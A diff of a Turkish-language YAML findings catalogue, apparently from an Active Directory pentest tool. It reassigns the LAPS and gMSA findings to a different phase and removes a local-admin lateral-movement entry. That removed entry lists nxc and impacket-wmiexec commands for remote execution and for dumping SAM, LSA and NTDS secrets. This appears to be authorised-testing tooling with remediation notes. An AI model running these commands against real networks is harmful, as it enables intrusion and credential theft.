@@ -933,7 +933,7 @@ laps-readable:
   title: "LAPS parolası fazla yetkiyle okunabilir"
   severity: high
   category: config
-  phase: postcred
+  phase: ad
   manual_only: false
   tags: [laps, ad]
   summary: "ms-Mcs-AdmPwd ACL'i geniş → yerel admin parolası okunur."
@@ -956,7 +956,7 @@ gmsa-readable:
   title: "gMSA parolası fazla yetkiyle okunabilir"
   severity: high
   category: config
-  phase: postcred
+  phase: ad
   manual_only: false
   tags: [gmsa, ad]
   summary: "msDS-ManagedPassword okuma yetkisi geniş → servis hesabı ele geçirme."
@@ -1713,36 +1713,6 @@ attack-path:
   references:
     - "https://bloodhound.specterops.io/"
     - "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology"
-
-local-admin:
-  title: "Kimlik bilgisi birden çok makinede yerel admin"
-  severity: high
-  category: cred
-  phase: postcred
-  manual_only: true
-  tags: [lateral, postcred]
-  summary: "Elde edilen kimlik bir veya daha çok hostta yerel yönetici → yatay hareket."
-  description: >
-    Spray/roast/relay/paylaşımdan elde edilen (veya verilen) kimlik bilgisi,
-    birden çok makinede yerel admin yetkisine sahip. Bu yatay hareket ve
-    kimlik bilgisi/secret toplama (LSASS/SAM) imkânı demektir.
-  detect_code: |
-    # postcred modülü — nxc smb auth (Pwn3d! = yerel admin)
-    nxc smb <hosts> -u user -p pass
-  exploit_code: |
-    # MANUEL (opt-in) — komut yürütme + secret toplama
-    nxc smb <ip> -u user -p pass -x "whoami /all"
-    impacket-wmiexec lab.local/user:pass@<ip>
-    nxc smb <ip> -u user -p pass --sam --lsa          # yerel secret
-    # (DA ise) --ntds ile domain hash'leri
-  exploitation: >
-    MANUEL — nxc ile Pwn3d! işaretli hostlarda komut yürütme (wmiexec/psexec),
-    secretsdump (LSASS/SAM) yalnız kapsam izin veriyorsa ve opt-in.
-  remediation: >
-    Yerel admin paylaşımını azaltın (LAPS), ayrıcalıklı kimlikleri Tier bazında
-    ayırın, yeniden-kullanılan parolaları engelleyin.
-  references:
-    - "https://book.hacktricks.xyz/windows-hardening/ntlm"
 
 mssql-access:
   title: "MSSQL erişimi (kimlikli/zayıf)"
